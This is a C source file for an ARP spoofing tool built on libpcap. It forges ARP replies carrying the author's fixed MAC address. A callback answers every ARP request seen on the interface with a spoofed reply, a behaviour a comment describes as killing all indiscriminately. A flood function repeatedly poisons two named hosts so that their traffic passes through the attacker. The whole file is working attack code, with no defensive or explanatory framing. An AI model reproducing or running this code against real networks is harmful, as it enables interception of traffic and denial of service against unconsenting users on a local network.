#include "arpspoof.h"

// 公共缓冲区
EtherHdr GLOBAL_ETHER_HDR;
ARPPacket GLOBAL_ARP_PACKET;
u_char FIXED_ARP_SPOOF_PACKET[ARP_SPOOF_SIZE] = {
        // ether header:
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // +0 dst mac, set before spoof
        0x00, 0x50, 0x56, 0xc0, 0x00, 0x08, // +6, the mac of mine, fixed
        0x08, 0x06,                         // +12, service type, arp
        // arp reply
        0x00, 0x01, 0x08, 0x00, 0x06, 0x04, // +14, fixed, unused
        0x00, 0x02,                         // +20, flag, arp reply
        // sender mac and ip
        0x00, 0x50, 0x56, 0xc0, 0x00, 0x08, // +22, spoof, the mac of mine, fixed
        0x00, 0x00, 0x00, 0x00,             // +28, sender ip, set before spoof, from packet from arp request
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // +32, target mac, set before spoof, from packet from arp request
        0x00, 0x00, 0x00, 0x00              // +38, target ip, set before spoof, from packet from arp request
};

//======================================table========================================
void init_table(struct a_table *table) {
    memset(table, 0, sizeof(struct a_table));
}

size_t insert_into_table(struct a_table *table, char *key, char *value) {
    if (table == NULL || key == NULL) {
        printf("insert error: table or key is null\n");
        return -1;
    } else if (table->size >= MAX_TABLE_SIZE) {
        printf("insert error: table is full\n");
        return -2;
    } else {
        size_t key_length = strlen(key);
        size_t value_length = strlen(value);
        if (key_length >= MAX_KEY_LENGTH || value_length >= MAX_VALUE_LENGTH) {
            printf("insert error: key or value str is too long...(%ld, %ld)\n", key_length, value_length);
            return -3;
        }
        memcpy(table->arp_items[table->size].key, key, key_length);
        memcpy(table->arp_items[table->size].value, value, value_length);
        return ++table->size;
    }
}

int find_in_table(struct a_table *table, const char *key) {
    if (table == NULL || key == NULL) {
        printf("find error: table or key is null\n");
        return -2;
    } else if (table->size == 0) {
        printf("find error: table empty\n");
        return -3;
    } else {
        for (int i = 0; i < table->size; ++i) {
            if (strcmp(key, table->arp_items[i].key) == 0) {
                return i;
            }
        }
        show_table(table);
        return -1;
    }
}

void show_table(struct a_table *table) {
    puts("==================================================================");
    for (int i = 0; i < table->size; ++i) {
        printf("%d) %s -> %s\n", i, table->arp_items[i].key, table->arp_items[i].value);
    }
    puts("==================================================================");
}

//====================================arp table======================================
size_t get_arp_table(ARPTable *arp_table) {
    FILE *fd = fopen("/proc/net/arp", "r");
    if (fd <= 0) {
        fprintf(stderr, "open arp table failed\n");
        return -1;
    } else {
        char temp_ip[MAX_KEY_LENGTH] = {0};
        char temp_mac[MAX_VALUE_LENGTH] = {0};
        // skip the first line
        while (!feof(fd) && fgetc(fd) != '\n');
        // init table
        // read mac and ip to arp_table
        while (!feof(fd) && (fscanf(fd, " %15[0-9.] %*s %*s %17[A-Fa-f0-9:] %*s %*s", temp_ip, temp_mac) == 2)) {
            insert_into_table(arp_table, temp_ip, temp_mac);
            memset(temp_ip, 0, MAX_KEY_LENGTH);
            memset(temp_mac, 0, MAX_VALUE_LENGTH);
        }
#ifdef DEBUG_FLAG
        show_table(arp_table);
#endif
        return arp_table->size;
    }
}

//=====================================arp packet generate and parse==================
int arp_spoof_make_packet(u_char *spoof_packet, size_t size,
                          const u_char *sender_ip, const u_char *dst_mac, const u_char *target_ip) {
    if (size < ARP_SPOOF_SIZE) {
        fprintf(stderr, "something error happened! too small buffer");
        return -1;
    } else {
        memcpy(spoof_packet, FIXED_ARP_SPOOF_PACKET, ARP_SPOOF_SIZE);
        memcpy(spoof_packet, dst_mac, 6);
        memcpy(spoof_packet + 28, sender_ip, 4);
        memcpy(spoof_packet + 32, dst_mac, 6);
        memcpy(spoof_packet + 38, target_ip, 4);
        return ARP_SPOOF_SIZE;
    }
}

int arp_spoof_parse_packet(const u_char *pkt_buff IN_ARG, size_t size IN_ARG,
                           EtherHdr *ether_hdr OUT_ARG, ARPPacket *arp OUT_ARG) {
    if (size <= 0) {
        fprintf(stderr, "something error happened! invalid arp packet!");
        return -1;
    } else {
        memset(ether_hdr, 0, sizeof(EtherHdr));
        memset(arp, 0, sizeof(ARPPacket));
        // +0 以太网帧头
        memcpy(ether_hdr->dst_mac, pkt_buff, 6);
        memcpy(ether_hdr->src_mac, pkt_buff + 6, 6);
        ether_hdr->type = ntohs(*((uint16_t *) (pkt_buff + 12)));
        // +14 arp
        arp->hardware_type = ntohs(*((uint16_t *) (pkt_buff + 14)));  // 0x0001
        arp->protocol_type = ntohs(*((uint16_t *) (pkt_buff + 16)));  // 0x0800
        arp->hardware_size = *(u_char *) (pkt_buff + 18); // 0x06
        arp->protocol_size = *(u_char *) (pkt_buff + 19); // 0x04
        arp->op_code = ntohs(*((uint16_t *) (pkt_buff + 20)));  // 请求
        // +22 两套地址
        memcpy(arp->sender_mac, pkt_buff + 22, 6);
        arp->sender_ip = (*((uint32_t *) (pkt_buff + 28)));
        memcpy(arp->target_mac, pkt_buff + 32, 6);
        arp->target_ip = (*((uint32_t *) (pkt_buff + 38)));
        // +42 报文结束
#ifdef DEBUG_FLAG
        show_ether(ether_hdr);
        puts("");
        show_arp(arp);
        puts("");
#endif
        return 0;
    }
}

//===================================function for print================================
void show_ether(const EtherHdr *etherhdr IN_ARG) {
    printf("dst mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
           etherhdr->dst_mac[0], etherhdr->dst_mac[1],
           etherhdr->dst_mac[2], etherhdr->dst_mac[3],
           etherhdr->dst_mac[4], etherhdr->dst_mac[5]);
    printf("src mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
           etherhdr->src_mac[0], etherhdr->src_mac[1],
           etherhdr->src_mac[2], etherhdr->src_mac[3],
           etherhdr->src_mac[4], etherhdr->src_mac[5]);
    printf("service type: %x\n", etherhdr->type);
    fflush(stdout);
    fflush(stderr);
}

void show_arp(const ARPPacket *arp IN_ARG) {
    struct in_addr temp_in_addr;
    // unused/fixed: 0x0001/0x0800/0x06/0x04
    printf("hardware type: %x, ", arp->hardware_type);
    printf("protocol type: %x, ", arp->protocol_type);
    printf("hardware size: %x, ", arp->hardware_size);
    printf("protocol size: %x\n", arp->protocol_size);
    // useful
    printf("op_code: %x(%s)\n", arp->op_code, arp->op_code == 1 ? "request" : "reply");
    printf("sender mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
           arp->sender_mac[0], arp->sender_mac[1],
           arp->sender_mac[2], arp->sender_mac[3],
           arp->sender_mac[4], arp->sender_mac[5]);
    temp_in_addr.s_addr = arp->sender_ip;
    printf("sender ip: %s\n", inet_ntoa(temp_in_addr));
    printf("target mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
           arp->target_mac[0], arp->target_mac[1],
           arp->target_mac[2], arp->target_mac[3],
           arp->target_mac[4], arp->target_mac[5]);
    temp_in_addr.s_addr = arp->target_ip;
    printf("target ip: %s\n", inet_ntoa(temp_in_addr));
    fflush(stdout);
    fflush(stderr);
}

//==================================callback function and pcap===========================
void pkthdr4arp_spoof(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *pkt_buff) {
    // 不管是谁的, 通杀...
#ifdef DEBUG_FLAG
    show_packet(pkt_buff, pkthdr->len);
    // parse arp packet
    arp_spoof_parse_packet(pkt_buff, pkthdr->len, &GLOBAL_ETHER_HDR, &GLOBAL_ARP_PACKET);
#endif
    if (pkt_buff[21] == 0x01) {
        // arp req
        u_char send_buf[128] = {0};
        size_t size = 128;
        int ret = arp_spoof_make_packet(send_buf, size,
                                        pkt_buff + 38,
                                        pkt_buff + 6,
                                        pkt_buff + 28);
        pcap_t *hdl = (pcap_t *) args;
        // can't compete with the origin host
        ret = pcap_sendpacket(hdl, send_buf, ret);
        printf("libpcap send packet returned %d\n", ret);
        fflush(stdout);
        fflush(stderr);
#ifdef DEBUG_FLAG
        puts("send packet: ");
        show_packet(send_buf, ARP_SPOOF_SIZE);
        // parse arp packet
        arp_spoof_parse_packet(send_buf, ARP_SPOOF_SIZE, &GLOBAL_ETHER_HDR, &GLOBAL_ARP_PACKET);
#endif
    }

}

int arp_spoof() {
    // variables
    pcap_t *handle;
    char errbuf[PCAP_BUF_SIZE];

    struct bpf_program fp;
    char *bpf_filter_str = "arp";

    // get and print network interface device and it's net...
    bpf_u_int32 mask, net;
    if (pcap_lookupnet(DEVICE_NAME, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "could not get netmask for device %s: %s\n", DEVICE_NAME, errbuf);
        return -2;
    }

    // convert..
    struct in_addr temp_in_addr;
    char net_str[16];
    char mask_str[16];
    temp_in_addr.s_addr = net;
    strcpy(net_str, inet_ntoa(temp_in_addr));
    temp_in_addr.s_addr = mask;
    strcpy(mask_str, inet_ntoa(temp_in_addr));
    fprintf(stdout, "found device: %s<%s><%s>\n", DEVICE_NAME, net_str, mask_str);
    // promise mode
    handle = pcap_open_live(DEVICE_NAME, BUFSIZ, 1, 100, errbuf);
    // handle = pcap_open_offline("/home/bing/文档/wireshark_saves/arp.cap", errbuf);

    if (handle == NULL) {
        fprintf(stderr, "could not open the device: %s: %s\n", DEVICE_NAME, errbuf);
        return -3;
    }

    // compile
    if (pcap_compile(handle, &fp, bpf_filter_str, 0, net) == -1) {
        fprintf(stderr, "could not parse filter %s: %s\n", bpf_filter_str, pcap_geterr(handle));
        pcap_close(handle);
        return -4;
    }

    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "could not install filter %s: %s\n", bpf_filter_str, pcap_geterr(handle));
        pcap_close(handle);
        return -5;
    }

    fflush(stderr);
    fflush(stdout);
    pcap_loop(handle, -1, pkthdr4arp_spoof, (u_char *) handle);
    return 0;
}

//==================================arp spoof ...flood...=================================
int arp_get_mac(struct a_table *arp_table, const char *ip, u_char *temp_mac) {
    int ret = find_in_table(arp_table, ip);
    if (ret < 0) {
        return -1;
    } else {
        sscanf(arp_table->arp_items[ret].value, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
               temp_mac, temp_mac + 1, temp_mac + 2, temp_mac + 3, temp_mac + 4, temp_mac + 5);
        return 0;
    }
}


void arp_spoof_flood(const char ip_list[2][16], int timeout, int cnt) {
    // just two hosts, do this function
    // generate arp table
    ARPTable arp_table = {0};
    init_table(&arp_table);
    get_arp_table(&arp_table);
    u_char temp_mac[8];
    u_char arp_packet_buffers[MAX_SPOOF_FLOOD_HOSTS][ARP_SPOOF_SIZE] = {0};
    in_addr_t ip1, ip2;
    ip1 = inet_addr(ip_list[0]);
    ip2 = inet_addr(ip_list[1]);
    // make packet
    // sender ip = ip1, target mac = from arp table(ip2) target ip = ip2;
    int ret = arp_get_mac(&arp_table, ip_list[0], temp_mac);
    if (ret < 0) {
        fprintf(stderr, "can't not find ip '%s' in arp table\n", ip_list[0]);
        return;
    }
    arp_spoof_make_packet(arp_packet_buffers[0], ARP_SPOOF_SIZE, (const u_char *) &ip2, (const u_char *) temp_mac,
                          (const u_char *) &ip1);
    ret = arp_get_mac(&arp_table, ip_list[1], temp_mac);
    if (ret < 0) {
        fprintf(stderr, "can't not find ip '%s' in arp table\n", ip_list[1]);
        return;
    }
    arp_spoof_make_packet(arp_packet_buffers[1], ARP_SPOOF_SIZE, (const u_char *) &ip1, (const u_char *) temp_mac,
                          (const u_char *) &ip2);
    // arp_spoof_make_packet over, print it
#ifdef DEBUG_FLAG
    show_packet(arp_packet_buffers[0], ARP_SPOOF_SIZE);
    show_packet(arp_packet_buffers[1], ARP_SPOOF_SIZE);
#endif
    // send packet, raw socket
    char errbuf[PCAP_BUF_SIZE];
    pcap_t *handle = pcap_open_live(DEVICE_NAME, BUFSIZ, 1, 100, errbuf);
    int total = 0;
    while (cnt--) {
        pcap_sendpacket(handle, arp_packet_buffers[0], ARP_SPOOF_SIZE);
        pcap_sendpacket(handle, arp_packet_buffers[1], ARP_SPOOF_SIZE);
        usleep(timeout);
        printf("send %d(double) packets\n", ++total);
        if (total % 10 == 0) {
            fflush(stdout);
        }
    }

}